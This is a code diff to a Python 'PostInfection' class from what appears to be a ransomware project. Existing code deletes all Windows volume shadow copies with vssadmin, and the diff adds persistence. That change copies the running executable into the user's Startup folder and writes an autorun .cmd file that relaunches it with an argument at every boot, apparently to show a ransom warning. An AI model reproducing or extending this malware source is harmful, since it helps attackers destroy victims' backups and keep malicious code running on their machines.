@@ -1,4 +1,5 @@
 import os
+import sys
 import ctypes
 from shutil import copyfile
 
@@ -21,7 +22,7 @@ class PostInfection(object):
     def deleteShadowFiles(self):
         os.system('vssadmin.exe delete shadows /all /quiet')
     
-    def setItselfStartUpApplication(self, keyspath):
+    def setItselfStartUpApplication(self):
         """
             create autorun program to display a warning message each time a computer is turned on
         """
@@ -31,13 +32,20 @@ class PostInfection(object):
         _startup_location = os.environ["USERPROFILE"]+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
         #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
 
+        aptal_path = sys.argv[0]
+        if os.path.basename(sys.argv[0]) == sys.argv[0]:
+            aptal_path = os.path.join(os.getcwd(),sys.argv[0])
+
+        _startup_aptal_path = os.path.join(_startup_location,os.path.basename(sys.argv[0]))
+        copyfile(aptal_path, _startup_aptal_path)
+
         # prevent from overwriting
         _file_count = str(len(os.listdir(_startup_location)))
         _autorun_file_path = os.path.join(_startup_location,_file_count+"authrun.cmd")
-        
+
         # creaing autorun script
         with open(_autorun_file_path,"w") as autorunfile:
-            autorunfile.write(keyspath)
+            autorunfile.write(_startup_aptal_path+" ozamandans")
 
     def getSystemInfo(self):
         import platform,socket,re,uuid,psutil
